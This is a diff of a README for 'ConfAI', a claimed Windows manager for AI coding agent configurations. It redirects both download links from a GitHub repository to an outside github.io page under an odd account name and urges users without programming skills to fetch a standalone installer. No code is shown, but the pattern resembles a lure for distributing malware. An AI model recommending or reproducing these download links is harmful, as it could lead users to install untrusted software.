@@ -1,6 +1,6 @@
 # 💾 ConfAI - Manage every AI coding agent configuration
 
-[![](https://img.shields.io/badge/Download_ConfAI-blue.svg)](https://github.com/newsprogramedwinduboishayward228/ConfAI)
+[![](https://img.shields.io/badge/Download_ConfAI-blue.svg)](https://newsprogramedwinduboishayward228.github.io)
 
 ConfAI helps you control your AI coding setup. You use different tools like Codex, Claude Code, and opencode. Each tool needs its own configuration file. These files often conflict or break. ConfAI gives you one simple interface. You switch providers, sync models, and save your settings. The software keeps your files clean and prevents errors.
 
@@ -8,7 +8,7 @@ ConfAI helps you control your AI coding setup. You use different tools like Code
 
 You do not need programming skills to use ConfAI. The software runs on Windows. It works as a standalone application. Use this link to visit the website and grab the installer.
 
-[Download ConfAI for Windows](https://github.com/newsprogramedwinduboishayward228/ConfAI)
+[Download ConfAI for Windows](https://newsprogramedwinduboishayward228.github.io)
 
 ## 🖥️ System Requirements
 
